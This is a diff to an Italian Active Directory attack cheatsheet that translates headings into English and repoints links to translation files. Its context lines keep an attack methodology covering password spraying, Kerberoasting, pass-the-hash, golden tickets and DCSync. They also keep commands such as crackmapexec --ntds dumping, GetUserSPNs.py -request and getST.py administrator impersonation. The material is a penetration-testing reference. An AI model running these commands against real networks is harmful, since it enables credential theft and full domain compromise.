@@ -27,16 +27,16 @@
 │                    METODOLOGIA DI ATTACCO AD                            │
 ├─────────────────────────────────────────────────────────────────────────┤
 │                                                                         │
-│   FASE 1: Enumerazione      FASE 2: Accesso Iniziale   FASE 3: PrivEsc  │
-│   ├── Scansione di Rete     ├── Password Spray         ├── Kerberoast   │
-│   ├── Enum LDAP             ├── LLMNR Poisoning        ├── AS-REP       │
-│   ├── Enum Utenti           └── NTLM Relay             └── ACL Abuse    │
+│   FASE 1: Enumeration     FASE 2: Initial Access    FASE 3: PrivEsc │
+│   ├── Network Scan         ├── Password Spray         ├── Kerberoast   │
+│   ├── LDAP Enum            ├── LLMNR Poison           ├── AS-REP       │
+│   ├── User Enum            └── NTLM Relay             └── ACL Abuse    │
 │   └── BloodHound                                                        │
 │                                                                         │
-│   FASE 4: Movimento Lat.    FASE 5: Persistenza        FASE 6: Dominio  │
-│   ├── Pass-the-Hash         ├── Golden Ticket          ├── DCSync       │
-│   ├── WinRM/PSExec          ├── Silver Ticket          ├── NTDS.dit     │
-│   └── WMI Exec              └── Skeleton Key           └── Full Pwn!    │
+│   FASE 4: Lateral Move    FASE 5: Persistence      FASE 6: Dominio   │
+│   ├── Pass-the-Hash        ├── Golden Ticket         ├── DCSync        │
+│   ├── WinRM/PSExec         ├── Silver Ticket         ├── NTDS.dit      │
+│   └── WMI Exec             └── Skeleton Key          └── Full Pwn!     │
 │                                                                         │
 └─────────────────────────────────────────────────────────────────────────┘
 ```
@@ -45,17 +45,17 @@
 
 ## 📋 Tabella dei Contenuti
 
-1. [Fase 1: Enumerazione](#-fase-1-enumerazione)
-2. [Fase 2: Accesso Iniziale](#-fase-2-accesso-iniziale)
+1. [Fase 1: Enumeration](#-fase-1-enumeration)
+2. [Fase 2: Initial Access](#-fase-2-initial-access)
 3. [Fase 3: Privilege Escalation](#-fase-3-privilege-escalation)
-4. [Fase 4: Movimento Laterale](#-fase-4-movimento-laterale)
-5. [Fase 5: Persistenza](#-fase-5-persistenza)
+4. [Fase 4: Lateral Movement](#-fase-4-lateral-movement)
+5. [Fase 5: Persistence](#-fase-5-persistence)
 6. [Fase 6: Dominio (Domain Dominance)](#-fase-6-dominio-domain-dominance)
 7. [Riferimento Rapido Comandi](#-riferimento-rapido-comandi)
 
 ---
 
-## 🔍 Fase 1: Enumerazione
+## 🔍 Fase 1: Enumeration
 
 ### 1.1 Discovery di Rete
 
@@ -77,7 +77,7 @@ nmap -p 88,135,139,389,445,464,636,3268,3269 -sV 10.10.10.10
 | 636 | LDAPS | LDAP Sicuro |
 | 5985 | WinRM | Gestione remota |
 
-### 1.2 Enumerazione Anonima (Senza Credenziali)
+### 1.2 Enumeration Anonima (Senza Credenziali)
 
 ```bash
 # Sessione nulla RPC
@@ -103,11 +103,11 @@ crackmapexec smb 10.10.10.10 -u user -p password --users
 crackmapexec smb 10.10.10.10 -u user -p password --groups
 crackmapexec smb 10.10.10.10 -u user -p password --shares
 
-# Enumerazione LDAP
+# Enumeration LDAP
 ldapdomaindump -u 'DOMAIN\user' -p 'password' 10.10.10.10
 ```
 
-### 1.4 Enumerazione PowerView
+### 1.4 Enumeration PowerView
 
 ```powershell
 # Importa PowerView
@@ -151,7 +151,7 @@ MATCH (u:User)-[:DCSync|:GetChanges|:GetChangesAll]->(d:Domain) RETURN u.name
 
 ---
 
-## 🔑 Fase 2: Accesso Iniziale
+## 🔑 Fase 2: Initial Access
 
 ### 2.1 Password Spraying
 
@@ -298,7 +298,7 @@ getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/F
 
 ---
 
-## ➡️ Fase 4: Movimento Laterale
+## ➡️ Fase 4: Lateral Movement
 
 ### 4.1 Pass-the-Hash
 
@@ -352,7 +352,7 @@ dir \\server\share
 
 ---
 
-## 🔒 Fase 5: Persistenza
+## 🔒 Fase 5: Persistence
 
 ### 5.1 Golden Ticket
 
@@ -428,7 +428,7 @@ crackmapexec smb DC01 -u admin -p password --ntds
 
 ## 📊 Riferimento Rapido Comandi
 
-### One-Liner per Enumerazione
+### One-Liner per Enumeration
 
 ```bash
 # Trova i DC
@@ -478,16 +478,16 @@ GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request
 
 ---
 
-## 📚 Cheatsheets Collegate
+## 📚 Cheatsheets Correlate
 
-- [BloodHound](../BloodHound/README.md)
-- [Impacket](../Impacket/README.md)
-- [CrackMapExec](../CrackMapExec/README.md)
-- [Rubeus](../Rubeus/README.md)
-- [PowerView](../PowerView/README.md)
-- [Responder](../Responder/README.md)
-- [Evil-WinRM](../Evil-WinRM/README.md)
-- [Mimikatz](../Mimikatz/README.md)
+- [BloodHound](../BloodHound/translations/README.it.md)
+- [Impacket](../Impacket/translations/README.it.md)
+- [CrackMapExec](../CrackMapExec/translations/README.it.md)
+- [Rubeus](../Rubeus/translations/README.it.md)
+- [PowerView](../PowerView/translations/README.it.md)
+- [Responder](../Responder/translations/README.it.md)
+- [Evil-WinRM](../Evil-WinRM/translations/README.it.md)
+- [Mimikatz](../Mimikatz/translations/README.it.md)
 
 ---
 
